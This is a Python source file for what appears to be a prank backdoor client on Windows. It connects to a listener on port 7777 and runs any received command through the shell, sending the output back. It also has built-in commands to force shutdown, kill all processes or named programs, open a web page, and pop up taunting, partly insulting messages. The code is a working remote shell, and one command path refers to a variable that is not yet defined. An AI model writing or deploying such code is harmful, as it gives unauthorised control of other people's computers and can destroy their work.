import sys
import socket
import subprocess
import os
import time
import psutil
import platform
import tempfile
import webbrowser

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'  
    finally:
        s.close()
    return ip


SERVER_IP = get_ip()
PORT = 7777

print(f"Server IP: {SERVER_IP}, Port: {PORT}")

def start_script():
    s = socket.socket()
    s.connect((SERVER_IP, PORT))
    msg = s.recv(1024).decode()
    print('[*] server: ', msg)

    while True:
        cmd = s.recv(1024).decode()
        print(f'[+] Received command: {cmd}')
        
        if cmd.lower() == 'x':
            os.system('shutdown /s /f /t 0')
            break

        if cmd.lower() == 'g':
            os.system('taskkill /f /im gta_sa.exe')
        
        if cmd.lower() == 'b':
            os.system('taskkill /f /im chrome.exe')

        if cmd.lower() == 'link':
            youtube_url = "https://www.youtube.com/watch?v=MyAK56XBTko"
            webbrowser.open(youtube_url)  

     
        if cmd.lower() == '1':
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '2':
            set_text = "ras izam exla !!!!!!!!!!!"
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '3':
            set_text = "sad gameqcevi ?????? "
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '4':
            set_text = "chem xelshi xar pussy "
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '5':
            set_text = ">>>>>>>>>>>>>>>>>>>>> restart pc male iqneba gamagdo sheni pc dan <<<<<<<<<<<<<<<<<<<<<<<<<<<"
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '6':
            set_text = "ki rogor ara >>>>>>>>>>><<<<<<<<<<<<<<<<"
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')

        if cmd.lower() == '7':
            set_text = ">>>>>>>>>>>>>>>>>>>>>>LIBRON<<<<<<<<<<<<<<<<<<<<<"
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as temp_file:
                temp_file.write(set_text)
                temp_file_path = temp_file.name
            os.system(f'notepad {temp_file_path}')


        
        if cmd.lower() == 'kill':
            os.system('taskkill /f /t /im *')
            break

        if cmd.lower() == '123':
            break

        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed Successfully'.encode()

        s.send(result)

    s.close()

if __name__ == '__main__':
    while True:
        try:
            start_script()
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)  
            continue  
